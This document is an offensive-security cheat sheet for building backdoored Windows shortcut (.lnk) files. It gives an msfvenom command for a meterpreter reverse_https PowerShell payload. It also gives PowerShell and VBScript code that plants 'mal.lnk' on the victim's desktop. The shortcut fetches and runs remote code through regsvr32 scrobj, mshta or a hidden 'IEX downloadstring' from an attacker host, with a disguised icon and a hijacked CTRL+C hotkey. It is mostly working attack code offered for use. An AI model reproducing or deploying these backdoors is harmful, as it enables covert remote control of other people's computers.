# Shortcut Link

## 01 - Usage

### 1.1 - Create shortcut backdoor in powershell

- **Note:** The **TargetPath** has a limit of 260 characters long

If you're using powershell payload then it's recommended to use `psh-cmd` format instead of `psh`, `psh-reflection`, and `psh-net`

`$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=<IP> lport=<PORT> -f psh-cmd | sed 's/%COMSPEC% \/b \/c start \/b \/min powershell\.exe -nop -w hidden -e //g' | base64 -d > shell.ps1`

`$ cat pwsh_cmds.txt`

---

TODO: Remove timestamps in the .lnk file

```powershell
$shortcutPath = "C:\Users\" + $env:username + "\Desktop\mal.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($shortcutPath)
$Shortcut.TargetPath = 'C:\Windows\System32\cmd.exe'
$Shortcut.Arguments = '/c regsvr32 /s /n /u /i:http://<IP>/file.sct scrobj.dll'
# $Shortcut.TargetPath = 'C:\Windows\System32\mshta.exe'
# $Shortcut.Arguments = '/c http://<IP>/file.hta'
# $Shortcut.TargetPath = 'conhost.exe'
# $Shortcut.Arguments = "--headless powershell.exe -nop -NonI -Nologo -w hidden -c `"IEX ((new-object net.webclient).downloadstring(`'http://<IP>/shell.ps1`'))`"`""
$Shortcut.Description = "A shortcut backdoor"
# $Shortcut.IconLocation = 'C:\path\to\icon.ico'
$Shortcut.IconLocation = 'shell32.dll,21'
$Shortcut.hotkey = 'CTRL+C' # A hotkey to trigger the payload
$Shortcut.WindowStyle = 7
$Shortcut.WorkingDirectory = "C:\Users\" + $env:username + "\Public"
$Shortcut.Save()
```

### 1.2 - Create shortcut backdoor in VBScript

`$ cat lnkbackdoor.vbs`

---

```vbscript
Set objWS = WScript.CreateObject("WScript.Shell")
user = objWS.ExpandEnvironmentStrings("%UserName%")
strLinkFile = "C:\Users\" & user & "\Desktop\mal.lnk"
strTargetPath = "C:\Windows\System32\cmd.exe"
Set objLink = objWS.CreateShortcut(strLinkFile)

objLink.TargetPath = strTargetPath
objLink.Arguments = "--headless powershell.exe -nop -NonI -Nologo -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://<IP>:<PORT>/shell.ps1'))"""
objLink.Description = "A shortcut backdoor"
' objLink.HotKey = "CTRL+C"
objLink.IconLocation = "shell32.dll,21"
objLink.WindowStyle = "7"
objLink.WorkingDirectory = "C:\Users\" & user & "\Public"
objLink.Save
```

`C:\> cscript //Nologo //B lnkbackdoor.vbs`

## 02 - Use Cases

TODO: Provide use cases if any

---
## References

- [SS64 Shortcut](https://ss64.com/nt/shortcut.html)

- [Shellgeek: Create Shortcuts on User Desktop Using Powershell](https://shellgeek.com/create-shortcuts-on-user-desktop-using-powershell/)

- [Hull1.com: Customize Shortcut Icon](https://www.hull1.com/scriptit/2020/08/15/customize-shortcut-icon.html)

- [Simontimms: Creating a Shortcut](https://blog.simontimms.com/2021/05/10/creating-a-shortcut/)

- [Uperesia Booby Trapped Shortcut](https://www.uperesia.com/booby-trapped-shortcut)

- [Pentestlab Blog: Persistence Shortcut Modification](https://pentestlab.blog/2019/10/08/persistence-shortcut-modification/)

- [Windows Persistence Shortcut Modification](https://www.hackingarticles.in/windows-persistence-shortcut-modification-t1547/

- [Malicious LNK File Abuse Hotkey Feature](https://github.com/nobodyatall648/Malicious-LNK-File-Abuse-Hotkey-Feature)

- [Create Shortcut Using VBScript](https://think.unblog.ch/en/create-shortcut-using-vbscript/)

- [Create-HotKeyLNK.ps1](https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Create-HotKeyLNK.ps1)